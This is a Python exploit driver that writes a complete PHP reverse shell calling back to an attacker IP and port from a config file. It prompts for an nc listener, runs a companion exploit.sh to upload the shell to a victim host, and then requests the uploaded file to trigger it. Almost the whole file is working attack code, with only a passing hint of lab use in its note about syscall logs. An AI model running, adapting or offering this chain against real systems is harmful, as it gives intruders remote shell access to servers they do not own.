import create_conf
import os
import sys
import requests
import errno
import socket
from datetime import datetime
from configparser import ConfigParser 		  

def check_port(ip, port):

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.bind((ip, port))
	except socket.error as e:
		if e.errno == errno.EADDRINUSE:
			return True
		else:
			# something else raised the socket.error exception
			print(e)
			sys.exit()
	return False

	s.close()
						  
config_object = ConfigParser()			  
config_object.read("config.ini")


attacker_info = config_object["ATTACKERINFO"]
victim_info = config_object["VICTIMINFO"]

flag = False

print('[+] Executing exploit...')
print('[?] Do you wish to continue? (y|n)')
ans = input()

if not ans:
	sys.exit()

if os.path.exists('./config.ini'):
	print('[+] Config file detected')
	print('[?] Do you wish to modify the configuration file? (y|n)')
	ans = input()
	if(ans == 'y' or ans == 'Y'):
		flag = True
if flag:
	create_conf.gen_config()

f = open("reverse_shell.php", "w")

start = '''
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '{ip}';
$port = {port}; 
'''.format(ip = attacker_info["ip"], port = int(attacker_info["port"])) 

end = '''
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>

'''

code = start + end

f.write(code)

f.close()

print('[+] Reverse Shell generated')

print('[*] Please open a listener on ', attacker_info['port'])

flag = False
print('[*] Press Enter to proceed when ready')
ans = input()
ans1 = ''
while not check_port(attacker_info["ip"], int(attacker_info["port"])) and ans1 == '':
	print('[-] No listener detected, if you wish to proceed without one, type "pass" (without quotes)')
	print('[-] Else create a listener and press Enter (example: nc -lnvp {port})'.format(port = attacker_info['port']))
	ans1=input()
	

print('[*] Executing exploit')

now = datetime.now()

os.system('''bash exploit.sh -u {ip} -f {path}'''.format(ip = victim_info["ip"], path = ( os.getcwd() + '/reverse_shell.php')))

print("[*] Checking if url was generated")

if os.path.exists('./tmp_file_with_dest_url.txt'):
	print('[+] URL generated') 
	f = open('./tmp_file_with_dest_url.txt', 'r')
	url = 'http://' + victim_info['ip'] + ':' + victim_info['port'] + str(f.readline()).replace('\n', '')
	print('[*] Making request to execute reverse shell, verify your listener')
	# Make the timeout very low in order not to wait for response
	# Make the exception pass so that the user does not get an error 
	try:
    		requests.get(url, timeout=0.0000000001)
	except requests.exceptions.ReadTimeout: 
    		pass
	os.remove('./tmp_file_with_dest_url.txt')
	print('[*] The exact time before lauching the exploit was: ', now)
	print('[*] Use this time to help you filter the syscall logs')

else:
	print('[-] URL wasn\'t generated, you might need to run the exploit another time')
	print('[-] If the problem persists, please confirm the information you passed')
	
	sys.exit()
	

